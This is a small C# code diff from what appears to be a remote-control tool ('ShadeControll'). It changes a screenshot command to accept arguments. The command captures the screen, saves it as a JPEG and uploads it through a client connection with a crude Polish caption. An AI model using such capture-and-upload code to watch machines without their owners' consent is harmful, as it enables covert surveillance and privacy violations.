@@ -16,7 +16,7 @@ namespace ShadeControll.Commands
             Description = "Zrobienie zrzutu ekranu komputera.";
         }
 
-        public override void Execute()
+        public override void Execute(string[] args)
         {
             if (!Directory.Exists("SCR")) { Directory.CreateDirectory("SCR"); }
             Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
@@ -27,7 +27,7 @@ namespace ShadeControll.Commands
             captureBitmap.Save(fileName, ImageFormat.Jpeg);
             Thread.Sleep(1000);
             Program.Client.UploadFile(fileName, "elo pomelo szmaty");
-            base.Execute();
+            base.Execute(args);
         }
     }
 }
